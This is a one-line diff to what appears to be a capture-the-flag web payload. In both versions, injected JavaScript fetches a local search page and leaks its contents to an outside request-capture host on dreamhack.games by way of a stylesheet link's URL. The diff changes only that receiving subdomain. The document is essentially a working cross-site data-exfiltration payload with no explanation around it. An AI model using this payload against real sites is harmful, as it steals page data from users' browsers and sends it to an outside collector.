@@ -1,1 +1,1 @@
-fetch("http://127.0.0.1:5000/search?query=scpCTF").then(res=>res.text()).then(text=>{const l = document.createElement('link');l.rel='stylesheet';l.href='https://ufkrmfo.request.dreamhack.games/?data='+ encodeURIComponent(text);document.head.appendChild(l);})
+fetch("http://127.0.0.1:5000/search?query=scpCTF").then(res=>res.text()).then(text=>{const l = document.createElement('link');l.rel='stylesheet';l.href='https://ktkhaev.request.dreamhack.games/?data='+ encodeURIComponent(text);document.head.appendChild(l);})
